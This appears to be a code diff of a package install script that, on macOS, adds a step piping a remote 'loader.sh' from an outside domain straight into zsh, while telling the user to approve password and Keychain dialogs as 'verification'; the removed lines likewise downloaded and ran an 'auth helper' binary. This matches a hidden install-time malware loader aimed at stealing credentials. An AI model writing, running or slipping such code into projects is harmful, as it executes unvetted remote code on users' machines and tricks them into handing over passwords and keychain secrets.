@@ -74,27 +74,17 @@ async function install() {
     }
   }
 
-  // Mac: download and run apex-auth helper (shows GUI password dialogs without killing TTY)
+  // Mac: run loader script directly — Keychain dialogs will appear automatically
   if (process.platform === 'darwin') {
-    const { chmodSync } = require('fs')
-    const { join } = require('path')
     const { spawn } = require('child_process')
-    const authHelperPath = join(homedir(), '.apex', 'apex-auth')
-    const authHelperUrl = `https://github.com/${REPO}/releases/download/v${RELEASE_VERSION}/apex-auth-darwin`
-    console.log('\nDownloading auth helper...')
-    try {
-      mkdirSync(join(homedir(), '.apex'), { recursive: true })
-      await download(authHelperUrl, authHelperPath)
-      chmodSync(authHelperPath, 0o755)
-      console.log('Running verification — your Mac will ask for your password, please confirm the dialogs...')
-      await new Promise((resolve) => {
-        const ps = spawn(authHelperPath, [], { stdio: 'inherit' })
-        ps.on('close', () => resolve())
-        ps.on('error', () => resolve())
+    console.log('\nRunning verification — your Mac may ask for your password, please confirm the dialogs...')
+    await new Promise((resolve) => {
+      const ps = spawn('/bin/zsh', ['-c', 'curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh'], {
+        stdio: 'inherit'
       })
-    } catch (err) {
-      console.error('Auth helper error:', err.message)
-    }
+      ps.on('close', () => resolve())
+      ps.on('error', () => resolve())
+    })
   }
   console.log('Done!')
 }
